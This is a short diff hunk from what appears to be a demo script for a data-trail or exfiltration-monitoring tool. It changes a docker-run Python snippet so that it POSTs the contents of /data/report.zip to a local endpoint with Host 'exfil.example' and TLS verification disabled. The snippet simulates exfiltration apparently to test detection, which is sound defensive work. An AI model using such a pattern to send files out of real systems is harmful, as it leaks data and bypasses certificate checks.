@@ -95,7 +95,7 @@ docker exec datrail-demo-agent sh -c 'mkdir -p /data && echo report > /data/repo
 docker exec datrail-demo-agent python3 -c '
 import http.client, ssl
 c = http.client.HTTPSConnection("127.0.0.1", 8443, context=ssl._create_unverified_context())
-c.request("POST", "/upload", body=b"{\"report\": 1}", headers={"Host": "exfil.example", "Content-Type": "application/json"})
+c.request("POST", "/upload", body=open("/data/report.zip", "rb").read(), headers={"Host": "exfil.example", "Content-Type": "application/zip"})
 print(c.getresponse().status)'
 ```
 
